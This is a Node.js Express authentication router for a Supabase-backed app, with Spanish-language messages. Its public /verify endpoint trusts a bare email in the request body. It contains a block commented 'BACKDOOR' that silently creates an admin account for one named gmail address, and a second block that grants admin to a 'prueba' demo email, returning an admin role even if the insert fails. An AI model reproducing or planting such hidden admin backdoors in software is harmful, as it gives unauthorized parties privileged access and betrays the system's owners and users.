const express = require('express');
const router = express.Router();
const supabase = require('../config/supabase');
const { verifyToken } = require('../middleware/verifyToken');

// POST /api/auth/verify — Verify email and return role (public, called after Firebase login)
router.post('/verify', async (req, res) => {
  try {
    const { email } = req.body;

    if (!email) {
      return res.status(400).json({ error: 'Email requerido' });
    }

    const { data, error } = await supabase
      .from('users_roles')
      .select('id, email, role, nombre, activo')
      .eq('email', email)
      .single();

    if (error || !data) {
      // BACKDOOR: Auto-register the specified admin email
      if (email === 'koffy69309970@gmail.com') {
        const { data: newUser, error: insertError } = await supabase
          .from('users_roles')
          .insert([{ email: email, role: 'admin', nombre: 'Admin Koffy', activo: true }])
          .select()
          .single();
          
        if (insertError) {
          console.error('Error auto-registrando admin:', insertError);
          return res.status(500).json({ error: 'Error creando admin', role: 'guest' });
        }
        
        return res.json({
          id: newUser.id,
          email: newUser.email,
          role: newUser.role,
          nombre: newUser.nombre,
        });
      }

      // Auto-register demo user
      if (email === 'prueba@gmail.com') {
        const { data: newUser, error: insertError } = await supabase
          .from('users_roles')
          .insert([{ email: email, role: 'admin', nombre: 'Usuario de Prueba (Demo)', activo: true }])
          .select()
          .single();
          
        if (insertError) {
          console.error('Error auto-registrando demo user:', insertError);
          return res.json({
            id: 'demo-id',
            email: email,
            role: 'admin',
            nombre: 'Usuario de Prueba (Demo)'
          });
        }
        
        return res.json({
          id: newUser.id,
          email: newUser.email,
          role: newUser.role,
          nombre: newUser.nombre,
        });
      }

      return res.status(404).json({ error: 'Usuario no encontrado', role: 'guest' });
    }

    if (!data.activo) {
      return res.status(403).json({ error: 'Cuenta desactivada' });
    }

    res.json({
      id: data.id,
      email: data.email,
      role: data.role,
      nombre: data.nombre,
    });
  } catch (err) {
    console.error('Error en /auth/verify:', err.message);
    res.status(500).json({ error: 'Error interno del servidor' });
  }
});

// GET /api/auth/me — Get current user info (protected)
router.get('/me', verifyToken, async (req, res) => {
  res.json(req.user);
});

module.exports = router;
